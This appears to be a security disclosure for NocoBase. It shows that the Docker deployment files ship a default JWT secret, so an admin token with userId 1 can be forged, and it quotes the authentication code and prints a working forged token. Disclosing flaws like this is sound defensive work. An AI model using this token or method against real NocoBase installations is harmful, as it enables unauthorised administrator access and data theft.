Before disclosing the vulnerability in detail, in order to better explain this vulnerability to you, I believe that this vulnerability in nocobase has the same principle as vulnerabilities such as CVE-2024-43441 and CVE-2025-30206.



Because the nocobase system uses Docker's one-click deployment feature, many operations and maintenance personnel directly use the default open-source JWT key. This allows attackers to easily forge JWTs and gain important system administrator privileges, including but not limited to obtaining sensitive data, adding and deleting users, and accessing OSS cloud keys. This poses a significant threat.



https://github.com/nocobase/nocobase/blob/main/docker/app-mysql/docker-compose.yml#L13

https://github.com/nocobase/nocobase/blob/main/docker/app-mariadb/docker-compose.yml#L13

https://github.com/nocobase/nocobase/blob/main/docker/app-postgres/docker-compose.yml#L11

https://github.com/nocobase/nocobase/blob/main/docker/app-sqlite/docker-compose.yml#L11



<img width="1537" height="995" alt="图片" src="https://github.com/user-attachments/assets/60138782-0592-4f76-a3d8-bbdb20ce3a8b" />




Although Nocobase recommends changing the JWT key in its deployment documentation, they do not mandate it.

https://docs.nocobase.com/welcome/getting-started/installation/docker-compose

<img width="1581" height="1123" alt="图片" src="https://github.com/user-attachments/assets/5ec3c8e3-36f2-4ab8-8edb-947c84c78270" />




So let's try deploying it locally.

```
git clone https://github.com/nocobase/nocobase.git
cd docker\app-mysql
docker-compose pull
docker-compose up -d
```



Next, let's analyze how its JWT is generated and what verification is included in the payload.



Step1: nocobase\docker\app-mysql\docker-compose.yml

```
- APP_KEY=your-secret-key # Replace it with your own app key
- ENCRYPTION_FIELD_KEY=your-secret-key # Replace it with your own app key
```

Step2: Search the key words `APP_KEY` and `ENCRYPTION_FIELD_KEY`

find `nocobase\packages\core\auth\src\base\jwt-service.ts`

```ts
/**
 * This file is part of the NocoBase (R) project.
 * Copyright (c) 2020-2024 NocoBase Co., Ltd.
 * Authors: NocoBase Team.
 *
 * This project is dual-licensed under AGPL-3.0 and NocoBase Commercial License.
 * For more information, please refer to: https://www.nocobase.com/agreement.
 */

import jwt, { JwtPayload, SignOptions } from 'jsonwebtoken';
import { ITokenBlacklistService } from './token-blacklist-service';
export interface JwtOptions {
  secret: string;
  expiresIn?: string;
}

export type SignPayload = Parameters<typeof jwt.sign>[0];

export class JwtService {
  constructor(
    protected options: JwtOptions = {
      secret: process.env.APP_KEY,
    },
  ) {
    const { secret, expiresIn } = options;
    this.options = {
      secret: secret || process.env.APP_KEY,
      expiresIn: expiresIn || process.env.JWT_EXPIRES_IN || '7d',
    };
  }

  public blacklist: ITokenBlacklistService;

  private expiresIn() {
    return this.options.expiresIn;
  }

  private secret() {
    return this.options.secret;
  }

  /* istanbul ignore next -- @preserve */
  sign(payload: SignPayload, options?: SignOptions) {
    const opt = { expiresIn: this.expiresIn(), ...options };
    if (opt.expiresIn === 'never') {
      opt.expiresIn = '1000y';
    }
    return jwt.sign(payload, this.secret(), opt);
  }

  /* istanbul ignore next -- @preserve */
  decode(token: string): Promise<JwtPayload> {
    return new Promise((resolve, reject) => {
      jwt.verify(token, this.secret(), (err, decoded: JwtPayload) => {
        if (err) {
          return reject(err);
        }

        resolve(decoded);
      });
    });
  }

  /**
   * @description Block a token so that this token can no longer be used
   */
  async block(token: string) {
    if (!this.blacklist) {
      return null;
    }
    try {
      const { exp, jti } = await this.decode(token);
      return this.blacklist.add({
        token: jti ?? token,
        expiration: new Date(exp * 1000).toString(),
      });
    } catch {
      return null;
    }
  }
}

```

We can find that the `sign` method of `JwtService` is used to generate JWT.

```ts
  /* istanbul ignore next -- @preserve */
  sign(payload: SignPayload, options?: SignOptions) {
    const opt = { expiresIn: this.expiresIn(), ...options };
    if (opt.expiresIn === 'never') {
      opt.expiresIn = '1000y';
    }
    return jwt.sign(payload, this.secret(), opt);
  }
```

Next we search the code base for where `JwtService.sign` is called.

`nocobase\packages\core\auth\src\base\auth.ts`

```ts
  async signNewToken(userId: number) {
    const tokenInfo = await this.tokenController.add({ userId });
    const expiresIn = Math.floor((await this.tokenController.getConfig()).tokenExpirationTime / 1000);
    const token = this.jwt.sign(
      {
        userId,
        temp: true,
        iat: Math.floor(tokenInfo.issuedTime / 1000),
        signInTime: tokenInfo.signInTime,
      },
      {
        jwtid: tokenInfo.jti,
        expiresIn,
      },
    );
    return token;
  }
```

At the same time, we have to see how the code verifies jwt authentication:

```ts
async checkToken(): Promise<{
  tokenStatus: 'valid' | 'expired' | 'invalid';
  user: Awaited<ReturnType<Auth['check']>>;
  jti?: string;
  temp: any;
  roleName?: any;
  signInTime?: number;
}> {
  const cache = this.ctx.cache as Cache;
  const token = this.ctx.getBearerToken();
  if (!token) {
    this.ctx.throw(401, {
      message: this.ctx.t('Unauthenticated. Please sign in to continue.', { ns: localeNamespace }),
      code: AuthErrorCode.EMPTY_TOKEN,
    });
  }

  let tokenStatus: 'valid' | 'expired' | 'invalid';
  let payload;
  try {
    payload = await this.jwt.decode(token);
    tokenStatus = 'valid';
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      tokenStatus = 'expired';
      payload = jwt.decode(token);
    } else {
      this.ctx.logger.error(err, { method: 'jwt.decode' });
      this.ctx.throw(401, {
        message: this.ctx.t('Your session has expired. Please sign in again.', { ns: localeNamespace }),
        code: AuthErrorCode.INVALID_TOKEN,
      });
    }
  }

  const { userId, roleName, iat, temp, jti, exp, signInTime } = payload ?? {};

  const user = userId
    ? await cache.wrap(this.getCacheKey(userId), () =>
        this.userRepository.findOne({
          filter: {
            id: userId,
          },
          raw: true,
        }),
      )
    : null;

  if (!user) {
    this.ctx.throw(401, {
      message: this.ctx.t('User not found. Please sign in again to continue.', { ns: localeNamespace }),
      code: AuthErrorCode.NOT_EXIST_USER,
    });
  }

  if (roleName) {
    this.ctx.headers['x-role'] = roleName;
  }

  const blocked = await this.jwt.blacklist.has(jti ?? token);
  if (blocked) {
    this.ctx.throw(401, {
      message: this.ctx.t('Your session has expired. Please sign in again.', { ns: localeNamespace }),
      code: AuthErrorCode.BLOCKED_TOKEN,
    });
  }

  const tokenPolicy = await this.tokenController.getConfig();

  if (signInTime && Date.now() - signInTime > tokenPolicy.sessionExpirationTime) {
    this.ctx.throw(401, {
      message: this.ctx.t('Your session has expired. Please sign in again.', { ns: localeNamespace }),
      code: AuthErrorCode.EXPIRED_SESSION,
    });
  }

  if (tokenStatus === 'valid' && Date.now() - iat * 1000 > tokenPolicy.tokenExpirationTime) {
    tokenStatus = 'expired';
  }

  if (tokenStatus === 'valid' && user.passwordChangeTz && iat * 1000 < user.passwordChangeTz) {
    this.ctx.throw(401, {
      message: this.ctx.t('User password changed, please signin again.', { ns: localeNamespace }),
      code: AuthErrorCode.INVALID_TOKEN,
    });
  }

  if (tokenStatus === 'expired') {
    if (tokenPolicy.expiredTokenRenewLimit > 0 && Date.now() - exp * 1000 > tokenPolicy.expiredTokenRenewLimit) {
      this.ctx.throw(401, {
        message: this.ctx.t('Your session has expired. Please sign in again.', { ns: localeNamespace }),
        code: AuthErrorCode.EXPIRED_SESSION,
      });
    }

    this.ctx.logger.info('token renewing', {
      method: 'auth.check',
      url: this.ctx.originalUrl,
      currentJti: jti,
    });
    const isStreamRequest = this.ctx?.req?.headers?.accept === 'text/event-stream';

    if (isStreamRequest) {
      this.ctx.throw(401, {
        message: 'Stream api not allow renew token.',
        code: AuthErrorCode.SKIP_TOKEN_RENEW,
      });
    }

    if (!jti) {
      this.ctx.throw(401, {
        message: this.ctx.t('Your session has expired. Please sign in again.', { ns: localeNamespace }),
        code: AuthErrorCode.INVALID_TOKEN,
      });
    }
    return { tokenStatus, user, jti, signInTime, temp };
  }

  return { tokenStatus, user, jti, signInTime, temp };
}
```

The `checkToken` method verifies the validity of the JWT through a series of checks, including:

- Checking the existence of the token.
- Decoding the token and checking for expiration.
- Checking the existence of the user.
- Checking whether the token is blacklisted.
- Checking the session expiration time.
- Checking the token expiration time.
- Checking the password change time.
- Handling the renewal logic for expired tokens.

Meanwhile, through black-box analysis, we discovered that the administrator's userid was consistently 1.

We can easily forge the time part. Our core focus here is the logic of finding the user from the database, that is, the `userId`



<img width="1729" height="1088" alt="图片" src="https://github.com/user-attachments/assets/9970117b-9de5-48ef-b0ac-9327e44cda56" />




We used our forged JWT credentials to attack the local Docker-run nocobase instance and discovered that we directly accessed sensitive backend interfaces, thus bypassing the credentials.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTc2MjMxMDI4MSwiZXhwIjoxNzM2MjIwMTk2MDB9.IiC9Tr-P5j5Vq0vWHV4riiozj2iG3Po8Z6Cf2yBm-3k
```

<img width="1535" height="705" alt="图片" src="https://github.com/user-attachments/assets/8f32afea-85bb-438f-863d-4fd0a3afce01" />









